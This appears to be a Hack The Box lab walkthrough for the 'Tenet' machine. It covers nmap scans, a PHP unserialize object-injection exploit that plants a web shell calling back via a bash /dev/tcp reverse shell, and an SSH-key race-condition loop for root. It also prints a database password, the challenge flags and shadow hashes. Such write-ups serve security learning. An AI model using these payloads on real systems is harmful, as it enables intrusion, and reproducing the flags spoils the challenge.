# Tenet Hackthebox Walkthrough

## All Ports Scan

```bash
# Nmap 7.91 scan initiated Sat Jun 19 14:13:19 2021 as: nmap -T4 -sT -p- -vv -oA nmap/allports 10.10.10.223
Warning: 10.10.10.223 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.223
Host is up, received echo-reply ttl 63 (0.15s latency).
Scanned at 2021-06-19 14:13:20 EDT for 1055s
Not shown: 65161 closed ports, 372 filtered ports
Reason: 65161 conn-refused and 372 no-responses
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jun 19 14:30:55 2021 -- 1 IP address (1 host up) scanned in 1056.04 seconds
```

## Complete Scan

```bash
# Nmap 7.91 scan initiated Sat Jun 19 14:14:22 2021 as: nmap -T4 -sT -sV -sC -A -vv -p22,80 -oA nmap/complete 10.10.10.223
Nmap scan report for 10.10.10.223
Host is up, received reset ttl 63 (0.21s latency).
Scanned at 2021-06-19 14:14:24 EDT for 29s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo=
|   256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (94%), Linux 3.2 (94%), Linux 5.3 - 5.4 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=6/19%OT=22%CT=%CU=34270%PV=Y%DS=2%DC=T%G=N%TM=60CE341D%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=9)
SEQ(SP=103%GCD=1%ISR=10F%TI=Z%CI=Z%TS=A)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 13.862 days (since Sat Jun  5 17:33:57 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   216.66 ms 10.10.14.1
2   216.71 ms 10.10.10.223

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 19 14:14:53 2021 -- 1 IP address (1 host up) scanned in 33.01 seconds
```

## Port 80 Enumeration

```bash
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.10.223/wordpress/]
/server-status        (Status: 403) [Size: 277]
```

![](Images/Pasted%20image%2020210619165137.png)

![](Images/Pasted%20image%2020210619165203.png)

![](Images/Pasted%20image%2020210619165236.png)

```php
<?php
class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();
?>
```

```php 
Exploit
<?php
class DatabaseExport
{
	public $user_file = 'shell.php';
	public $data = '<?php exec("/bin/bash -c \'bash \-i >& /dev/tcp/10.10.14.36/443 0>&1\'"); ?>';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

print urlencode(serialize(new DatabaseExport));
?>
```


![](Images/Pasted%20image%2020210619184202.png)

![](Images/Pasted%20image%2020210619184215.png)

### We got a shell 

![](Images/Pasted%20image%2020210619184230.png)

```sql
/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
```

```bash
Exploit
while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdVQ3XJVzHRwhGFtsdXYinconmnNkau8kVZXk2hp91PXaoKwWtSj3bBPoQMffehmnTkuiCEWFX+HqAW0RhteUu5/XakDT3r0JzcAd8JHKOa98cQlRZcY0Q5ec94glxhoFTGVGdIQVjAlnpyr37XHmeDWRch9e1pDNi42X9vvaIvbs5VV7ruzs5yld4TDP9FhPB/cNZHTYm+zuv5+ocHqXuID1YxdjeR9G+YFVhSB+xDqaXu+iZCa2h3jM2zuoY+XnAhMGeQwT9s+5JqNVYYOEp80sfDSybgMVYqbT7ie8z9tRUGN940pDRw0sqNm8RMEOQRfYvQb2nlQNVflvqYSYxD1hj92/Oks2IfBDCLXRCh4SWE8Y095iznxE8legWb0wgs1l/6xaprvpxQJtTGAZ9BTkMSdGX1h2fNO5wQNpsO2mxkMmlBqPvPv3Nd0i1r64Mfeicf4n9H9iSAlDoAhLPhPznGbFMxHOm7SdSX+B4ak2MIO8yZclndDABB3QxZ70= root@V0ld3rm0rt" | tee /tmp/ssh* > /dev/null; done
```

![](Images/Pasted%20image%2020210619201715.png)

```bash
Flags :
User Flag : 5fe05d2e83338dcdbd4215f168ba82a0
Root Flag : b827b7c60659abf9aa5b7792aff16034

Hash : 
root:$6$hfxS53gy$YDGYBt.0P7G3TpKB0qo.gkUNClP2CRMHyCNU/2aVjQSPN3mxpL4hs7XYX1XNM5mSEGiASvizwxTV0DToS/wDV.:18606:0:99999:7:::
neil:$6$xquMZsQQ$dLXIvDVhFRbwcG8ClzHoLNnkUHp1WJHEbCIWar9NrRTNL/qufsPJ5ypBdW.7tdMRuZ4vWAUD/1MF1WSdsywDK0:18612:0:99999:7:::
```